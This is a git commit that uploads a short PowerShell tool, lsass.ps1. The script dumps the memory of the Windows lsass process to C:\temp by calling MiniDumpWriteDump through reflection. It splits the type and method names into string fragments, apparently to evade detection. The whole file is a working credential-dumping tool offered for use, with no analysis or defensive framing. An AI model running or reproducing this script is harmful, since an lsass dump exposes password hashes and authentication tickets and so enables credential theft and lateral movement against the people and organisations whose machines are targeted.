c4ad0b116c2234bf0e06539565655389a276f5e7
Abdelmawla Elamrosy <52350704+0xDigimon@users.noreply.github.com>
2024-03-06 23:28:15 +0200

    Add files via upload

---
+++ Tools/lsass.ps1
@@ -0,0 +1,12 @@
+$S = "C:\temp"
+$P = (Get-Process lsass)
+$A = [PSObject].Assembly.GetType('Syst'+'em.Manage'+'ment.Autom'+'ation.Windo'+'wsErrorRe'+'porting')
+$B = $A.GetNestedType('Nativ'+'eMethods', 'Non'+'Public')
+$C = [Reflection.BindingFlags] 'NonPublic, Static'
+$D = $B.GetMethod('MiniDum'+'pWriteDump', $C) 
+$PF = "$($P.Name)_$($P.Id).dmp"
+$PDP = Join-Path $S $PF
+$F = New-Object IO.FileStream($PDP, [IO.FileMode]::Create)
+$R = $D.Invoke($null, @($P.Handle,$G,$F.SafeFileHandle,[UInt32] 2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero))
+$F.Close()
+$PDP
